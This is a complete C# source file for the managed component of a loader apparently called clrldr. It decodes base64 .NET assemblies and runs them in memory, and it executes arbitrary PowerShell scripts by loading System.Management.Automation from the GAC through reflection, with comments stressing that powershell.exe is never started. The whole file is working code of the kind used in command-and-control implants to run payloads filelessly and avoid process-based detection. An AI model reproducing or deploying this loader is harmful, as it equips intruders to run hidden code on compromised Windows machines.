// Executor.cs -- managed side of clrldr.
//
// Loaded once into a private AppDomain by the native host. Two entry points:
//
//   ExecuteAssembly(base64, args)  -- Assembly.Load(byte[]), capture Console,
//                                     invoke Main, return the text
//   ExecutePowerShell(script)      -- load Windows PowerShell 5.1's SMA from
//                                     the GAC (never powershell.exe), run the
//                                     script, return stdout + error records
//
// C# 4 / .NET Framework 4.x only: the host starts the v4.0.30319 runtime.

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

namespace AppRuntime
{
    public class Executor
    {
        /* ================= execute-assembly ================= */

        public static string ExecuteAssembly(string asmB64, string entryArgs)
        {
            StringBuilder outSb = new StringBuilder();

            try
            {
                byte[] bytes = Convert.FromBase64String(asmB64 ?? "");
                Assembly asm = Assembly.Load(bytes);
                MethodInfo ep = asm.EntryPoint;
                if (ep == null) return "[!] assembly has no entry point";

                TextWriter oldOut = Console.Out;
                TextWriter oldErr = Console.Error;
                StringWriter sw = new StringWriter(outSb);

                try
                {
                    Console.SetOut(sw);
                    Console.SetError(sw);

                    object result = null;
                    if (ep.GetParameters().Length > 0)
                        result = ep.Invoke(null, new object[] { SplitArgs(entryArgs) });
                    else
                        result = ep.Invoke(null, null);

                    Console.Out.Flush();
                    Console.WriteLine("[+] exit: " + (result ?? 0));
                }
                finally
                {
                    sw.Flush();
                    Console.SetOut(oldOut);
                    Console.SetError(oldErr);
                }

                return outSb.ToString();
            }
            catch (TargetInvocationException ex)
            {
                Exception inner = ex.InnerException != null ? ex.InnerException : ex;
                return (outSb.Length > 0 ? outSb.ToString() : "") + "[!] exception: " + inner;
            }
            catch (Exception ex)
            {
                return (outSb.Length > 0 ? outSb.ToString() : "") + "[!] exception: " + ex;
            }
        }

        // Space-separated, double quotes group a token. No escape sequences:
        // the native host already removed its own quoting before the call.
        private static string[] SplitArgs(string s)
        {
            List<string> list = new List<string>();
            StringBuilder cur = new StringBuilder();
            bool inQuotes = false;

            foreach (char c in s ?? "")
            {
                if (c == '"')
                {
                    inQuotes = !inQuotes;
                    continue;
                }
                if (c == ' ' && !inQuotes)
                {
                    if (cur.Length > 0)
                    {
                        list.Add(cur.ToString());
                        cur.Length = 0;
                    }
                }
                else
                {
                    cur.Append(c);
                }
            }

            if (cur.Length > 0) list.Add(cur.ToString());
            return list.ToArray();
        }

        /* ================= Windows PowerShell 5.1 ================= */

        private static byte[] s_smaBytes;
        private static Assembly s_smaAssembly;
        private static bool s_resolveHooked;

        private static bool FindGacSma(out byte[] bytes)
        {
            bytes = null;

            string[] roots = new string[]
            {
                @"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation",
                @"C:\Windows\assembly\GAC_MSIL\System.Management.Automation"
            };

            foreach (string root in roots)
            {
                if (!Directory.Exists(root)) continue;
                try
                {
                    string[] dirs = Directory.GetDirectories(root);
                    foreach (string dir in dirs)
                    {
                        string dll = Path.Combine(dir, "System.Management.Automation.dll");
                        if (File.Exists(dll))
                        {
                            bytes = File.ReadAllBytes(dll);
                            return true;
                        }
                    }
                }
                catch { }
            }
            return false;
        }

        private static string FindGacAssembly(string name)
        {
            string[] roots = new string[]
            {
                @"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\" + name,
                @"C:\Windows\assembly\GAC_MSIL\" + name,
                @"C:\Windows\Microsoft.NET\assembly\GAC_64\" + name,
                @"C:\Windows\assembly\GAC_64\" + name
            };

            foreach (string root in roots)
            {
                if (!Directory.Exists(root)) continue;
                try
                {
                    string[] dirs = Directory.GetDirectories(root);
                    foreach (string dir in dirs)
                    {
                        string dll = Path.Combine(dir, name + ".dll");
                        if (File.Exists(dll)) return dll;
                    }
                }
                catch { }
            }
            return null;
        }

        private static Assembly ResolveHandler(object sender, ResolveEventArgs args)
        {
            string name = args.Name.Split(',')[0].Trim();

            if (name == "System.Management.Automation") return s_smaAssembly;

            try
            {
                string path = FindGacAssembly(name);
                if (path != null) return Assembly.LoadFrom(path);
            }
            catch { }
            return null;
        }

        public static string ExecutePowerShell(string script)
        {
            StringBuilder outSb = new StringBuilder();
            object psInstance = null;
            Type psType = null;

            try
            {
                if (s_smaBytes == null && !FindGacSma(out s_smaBytes))
                    return "[!] System.Management.Automation.dll not found in GAC";

                if (s_smaAssembly == null) s_smaAssembly = Assembly.Load(s_smaBytes);

                psType = s_smaAssembly.GetType("System.Management.Automation.PowerShell");
                if (psType == null) return "[!] PowerShell type not found";

                if (!s_resolveHooked)
                {
                    AppDomain.CurrentDomain.AssemblyResolve += ResolveHandler;
                    s_resolveHooked = true;
                }

                MethodInfo create = psType.GetMethod("Create", Type.EmptyTypes);
                if (create == null) return "[!] PowerShell.Create not found";
                psInstance = create.Invoke(null, null);

                MethodInfo addScript = psType.GetMethod("AddScript", new Type[] { typeof(string) });
                if (addScript == null) return "[!] PowerShell.AddScript not found";
                addScript.Invoke(psInstance, new object[] { script });

                // Out-String keeps the result as text instead of live objects.
                MethodInfo addCommand = null;
                foreach (MethodInfo mi in psType.GetMethods())
                {
                    if (mi.Name == "AddCommand")
                    {
                        ParameterInfo[] parameters = mi.GetParameters();
                        if (parameters.Length == 1 && parameters[0].ParameterType == typeof(string))
                        {
                            addCommand = mi;
                            break;
                        }
                    }
                }
                if (addCommand != null) addCommand.Invoke(psInstance, new object[] { "Out-String" });

                MethodInfo invoke = null;
                foreach (MethodInfo mi in psType.GetMethods())
                {
                    if (mi.Name == "Invoke" && mi.GetParameters().Length == 0)
                    {
                        invoke = mi;
                        break;
                    }
                }
                if (invoke == null) return "[!] PowerShell.Invoke not found";

                object result = invoke.Invoke(psInstance, null);
                AppendResults(outSb, result);

                try
                {
                    object streams = psType.GetProperty("Streams").GetValue(psInstance, null);
                    object errors = streams.GetType().GetProperty("Error").GetValue(streams, null);
                    foreach (object error in (IEnumerable)errors)
                    {
                        object exception = error.GetType().GetProperty("Exception").GetValue(error, null);
                        outSb.AppendLine("[ps-error] " + exception);
                    }
                }
                catch { }

                return FinishOutput(outSb);
            }
            catch (TargetInvocationException ex)
            {
                Exception inner = ex.InnerException != null ? ex.InnerException : ex;
                return (outSb.Length > 0 ? outSb.ToString() : "") + "[!] ps exception: " + inner;
            }
            catch (Exception ex)
            {
                return (outSb.Length > 0 ? outSb.ToString() : "") + "[!] ps exception: " + ex;
            }
            finally
            {
                if (psInstance != null)
                {
                    try
                    {
                        MethodInfo dispose = psType.GetMethod("Dispose", Type.EmptyTypes);
                        if (dispose != null) dispose.Invoke(psInstance, null);
                    }
                    catch { }
                }
            }
        }

        private static string FinishOutput(StringBuilder sb)
        {
            string text = sb.ToString();
            if (text.Length == 0) return "";
            return text.TrimStart('\r', '\n').TrimEnd('\r', '\n') + "\r\n";
        }

        private static void AppendResults(StringBuilder sb, object result)
        {
            if (result == null) return;

            IEnumerable items = result as IEnumerable;
            if (items != null)
            {
                foreach (object item in items)
                {
                    if (item == null) continue;

                    string text = item as string;
                    if (text != null) sb.Append(text);
                    else sb.AppendLine(item.ToString());
                }
            }
            else
            {
                sb.AppendLine(result.ToString());
            }
        }
    }
}
